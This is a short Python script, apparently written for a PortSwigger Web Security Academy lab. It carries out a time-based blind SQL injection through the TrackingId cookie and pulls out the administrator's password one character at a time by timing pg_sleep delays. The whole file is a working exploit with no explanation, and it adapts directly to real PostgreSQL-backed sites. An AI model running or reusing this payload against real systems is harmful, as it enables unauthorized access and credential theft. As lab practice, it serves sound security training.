import requests
import string

url = "https://acd11fee1e8f4c39808e1a5e000200b0.web-security-academy.net/"


def query(payload):
    cookie = { 'TrackingId': payload }
    r = requests.get(url, cookies=cookie)

    if r.elapsed.total_seconds() > 5.0:
        return 1
    else:
        return 0

password = ''
i = 1
while True:
    for j in string.printable:
        payload = f"X' UNION SELECT CASE WHEN (username='administrator' AND substr(password, {i}, 1)='{j}') THEN (SELECT 'a' || pg_sleep(5)) END FROM users --"
        if query(payload) == 1:
            password += j
            break
    i += 1
    print(password)